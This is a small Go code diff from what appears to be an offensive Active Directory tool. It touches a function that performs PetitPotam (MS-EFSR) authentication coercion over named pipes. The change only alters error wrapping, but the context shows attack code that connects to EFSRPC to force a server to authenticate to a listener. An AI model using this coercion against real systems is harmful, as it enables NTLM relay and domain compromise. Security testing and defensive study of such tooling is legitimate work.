@@ -218,14 +218,14 @@ func coercePetitPotam(server, listener string, cred sspcred.Credential, timeout 
 		endpoint := fmt.Sprintf("ncacn_np:[%s]", pipe)
 		cc, err := dcerpc.Dial(ctx, server, dcerpc.WithEndpoint(endpoint))
 		if err != nil {
-			lastErr = fmt.Errorf("pipe %s: %v", pipe, err)
+			lastErr = fmt.Errorf("pipe %s: %w", pipe, err)
 			cancel()
 			continue
 		}
 
 		cli, err := efsrpc.NewEfsrpcClient(ctx, cc, dcerpc.WithSeal())
 		if err != nil {
-			lastErr = fmt.Errorf("pipe %s bind: %v", pipe, err)
+			lastErr = fmt.Errorf("pipe %s bind: %w", pipe, err)
 			cc.Close(ctx)
 			cancel()
 			continue
@@ -247,7 +247,7 @@ func coercePetitPotam(server, listener string, cred sspcred.Credential, timeout 
 			return coerceResult{Method: "PetitPotam (MS-EFSR)", Success: true, Message: msg}
 		}
 
-		lastErr = fmt.Errorf("pipe %s: %v", pipe, err)
+		lastErr = fmt.Errorf("pipe %s: %w", pipe, err)
 	}
 
 	return coerceResult{Method: "PetitPotam (MS-EFSR)", Success: false,
